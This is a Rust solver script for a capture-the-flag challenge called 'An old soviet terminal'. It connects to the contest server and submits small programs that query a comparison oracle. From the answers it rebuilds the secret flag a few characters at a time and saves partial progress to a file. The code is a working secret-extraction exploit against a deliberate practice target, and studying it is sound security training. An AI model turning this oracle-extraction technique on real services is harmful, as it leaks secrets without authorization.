// Windowed flag hunter for "An old soviet terminal".
//
// WHY windowed: the whole-flag retriever does ~35 chars x several compares = hundreds
// of receiver-local actor round-trips, and the receiver node only lives ~2500ms after
// the libp2p rendezvous. A short window (a few chars) finishes well inside that budget,
// so each lucky connection that DOES rendezvous actually returns something. We persist
// partial progress to flag_progress.txt and assemble across connections / restarts.
//
// Transport (staged): read ">>", send "4\n", read ">>", send program + "\nEOF\n".
// The result frame is teletype-rendered up to ~10s AFTER EOF and the server holds the
// socket open the whole time (confirmed via diag_drain) -> we wait LONG (FRAME_WAIT)
// and drain the full, possibly-slow result line.
//
//   rustc -O hunt.rs -o hunt
//   ./hunt [WINDOW] [GAP_SECS]      # default window=6 chars, gap=4s backoff
//
// Verdicts per connection: LENGTH / +<chars> / TIMEOUT(10s) / ERROR / no-frame / refused.
use std::io::{Read, Write};
use std::net::{TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};
use std::{env, fs, thread};

const HOST: &str = "challs.nusgreyhats.org";
const PORT: u16 = 36167;
// The server holds the connection open and only renders the frame at the end of its
// (~10s) budget; a successful flag may teletype back slowly. Wait generously -- read
// early-exits on the frame header, so only a truly silent socket waits the full cap.
const FRAME_WAIT: Duration = Duration::from_secs(60);
const TAIL_WAIT: Duration = Duration::from_secs(25); // drain the result line after the header
const CS: &str = "grey{}_etaoinshrdlcumwfgypbvkxjqz0123456789-!?.+=*ABCDEFGHIJKLMNOPQRSTUVWXYZ";
const PROG_FILE: &str = "flag_progress.txt";
const SEED: &str = "grey{"; // known flag prefix (indices 0..5) -- skip scanning it

fn contains(h: &[u8], n: &[u8]) -> bool { !n.is_empty() && n.len() <= h.len() && h.windows(n.len()).any(|w| w == n) }

fn read_until(s: &mut TcpStream, needle: &[u8], cap: Duration, buf: &mut Vec<u8>) {
    let mut tmp = [0u8; 8192];
    let t0 = Instant::now();
    loop {
        if t0.elapsed() >= cap { break; }
        match s.read(&mut tmp) {
            Ok(0) => break,
            Ok(n) => { buf.extend_from_slice(&tmp[..n]); if contains(buf, needle) { break; } }
            Err(e) => match e.kind() {
                std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut => continue,
                _ => break,
            },
        }
    }
}

fn attempt(addr: &std::net::SocketAddr, prog: &str) -> std::io::Result<String> {
    let mut s = TcpStream::connect_timeout(addr, Duration::from_secs(6))?;
    s.set_read_timeout(Some(Duration::from_millis(200)))?;
    s.set_write_timeout(Some(Duration::from_secs(8)))?;
    let mut buf = Vec::new();
    read_until(&mut s, b">>", Duration::from_secs(4), &mut buf);
    s.write_all(b"4\n")?; s.flush()?;
    buf.clear();
    read_until(&mut s, b">>", Duration::from_secs(4), &mut buf);
    s.write_all(prog.as_bytes())?; s.write_all(b"\nEOF\n")?; s.flush()?;
    buf.clear();
    // wait for the frame header (all 3 verdicts carry it), then drain the result line
    // until the menu redraws ("[1] Archive" always follows the frame) or TAIL_WAIT.
    read_until(&mut s, b"TELETYPE OUTPUT", FRAME_WAIT, &mut buf);
    read_until(&mut s, b"[1] Archive", TAIL_WAIT, &mut buf);
    Ok(String::from_utf8_lossy(&buf).into_owned())
}

// returns Some(message-text) on a real Message frame, None on TIMEOUT/ERROR/no-frame
fn message(out: &str) -> Option<String> {
    if out.contains("exceeded time allocation") || out.contains("[TIMEOUT]") { return None; }
    if out.contains("terminated abnormally") { return None; }
    out.lines()
        .find(|l| l.contains("Message:"))
        .map(|l| l.replace('\u{2551}', "").split("Message:").nth(1).unwrap_or("").trim().to_string())
        .filter(|m| !m.is_empty())
}

fn len_prog() -> String {
    "let val _=send(analysisService,(\"analyze\",self()))\n\
     val n=receive[hn(\"analysis\",L)=>L]\n\
     fun s i=if i>=n then \"\" else \"#\"^s(i+1)\n\
     in s 0 end".into()
}

fn window_prog(lo: usize, hi: usize) -> String {
    format!(
        "let val cs=\"{CS}\"\n\
         fun a j=substring(cs,j,j+1)\n\
         fun p i d=(send(analysisService,(\"compare\",self(),i,d));receive[hn(\"comparison\",s)=>(send(logService,(\"log\",self(),s));receive[hn(\"logged\",b)=>b])])\n\
         fun sc i j=if a j=\"\" then \"?\" else if p i(a j)then a j else sc i(j+1)\n\
         fun bd i h=if i>=h then \"\" else (sc i 0)^bd(i+1)h\n\
         in bd {lo} {hi} end"
    )
}

fn load() -> (Option<usize>, String) {
    let mut len = None;
    let mut found = SEED.to_string();
    if let Ok(t) = fs::read_to_string(PROG_FILE) {
        for ln in t.lines() {
            if let Some(v) = ln.strip_prefix("LEN=") { len = v.trim().parse().ok(); }
            if let Some(v) = ln.strip_prefix("FOUND=") { if !v.is_empty() { found = v.to_string(); } }
        }
    }
    (len, found)
}

fn save(len: Option<usize>, found: &str) {
    let l = len.map(|x| x.to_string()).unwrap_or_else(|| "?".into());
    let _ = fs::write(PROG_FILE, format!("LEN={l}\nFOUND={found}\n"));
}

fn ts() -> String {
    // crude wall-clock-free counter stamp via process uptime is not available; use a
    // monotonic-ish marker. Keep it simple: caller prints try numbers.
    String::new()
}

fn main() {
    let argv: Vec<String> = env::args().skip(1).collect();
    let window: usize = argv.get(0).and_then(|x| x.parse().ok()).unwrap_or(6);
    let gap: u64 = argv.get(1).and_then(|x| x.parse().ok()).unwrap_or(4);
    let addr = (HOST, PORT).to_socket_addrs().ok().and_then(|mut a| a.next()).expect("DNS");

    let (mut len, mut found) = load();
    save(len, &found);
    println!("[hunt] window={window} gap={gap}s  start: LEN={:?} FOUND={:?}", len, found);

    let mut tries = 0u64;
    let _ = ts();
    loop {
        // complete?
        if let Some(l) = len {
            if found.chars().count() >= l {
                println!("\n#### FLAG: {found} ####");
                let _ = fs::write("flag.txt", &found);
                return;
            }
        }
        tries += 1;
        let lo = found.chars().count();
        let (mode, prog) = if len.is_none() {
            ("len", len_prog())
        } else {
            let hi = (lo + window).min(len.unwrap());
            ("win", window_prog(lo, hi))
        };
        let t0 = Instant::now();
        match attempt(&addr, &prog) {
            Err(e) => {
                println!("[t{tries}] refused: {e} ({:.1}s)  FOUND={found:?}", t0.elapsed().as_secs_f32());
                thread::sleep(Duration::from_secs(gap.max(2)));
            }
            Ok(out) => match message(&out) {
                Some(m) => {
                    if mode == "len" {
                        let n = m.chars().filter(|c| *c == '#').count();
                        if n > 0 {
                            len = Some(n);
                            save(len, &found);
                            println!("[t{tries}] LENGTH={n} ({:.1}s)", t0.elapsed().as_secs_f32());
                        } else {
                            println!("[t{tries}] len reply had no '#': {m:?} ({:.1}s)", t0.elapsed().as_secs_f32());
                            thread::sleep(Duration::from_secs(gap));
                        }
                    } else {
                        // append chars up to a '?' sentinel (charset miss / overshoot guard)
                        let chunk: String = m.chars().take_while(|c| *c != '?').collect();
                        if chunk.is_empty() {
                            println!("[t{tries}] WIN[{lo}..] returned no usable chars: {m:?} -- charset gap?", );
                            thread::sleep(Duration::from_secs(gap));
                        } else {
                            found.push_str(&chunk);
                            save(len, &found);
                            println!("[t{tries}] +{chunk:?}  ({:.1}s)  FOUND={found:?}", t0.elapsed().as_secs_f32());
                        }
                    }
                }
                None => {
                    let v = if out.contains("exceeded time") || out.contains("[TIMEOUT]") {
                        "TIMEOUT(10s)"
                    } else if out.contains("abnormally") {
                        "ERROR(abnormal)"
                    } else {
                        "no-frame"
                    };
                    println!("[t{tries}] {v} ({:.1}s)  FOUND={found:?}", t0.elapsed().as_secs_f32());
                    thread::sleep(Duration::from_secs(gap));
                }
            },
        }
    }
}
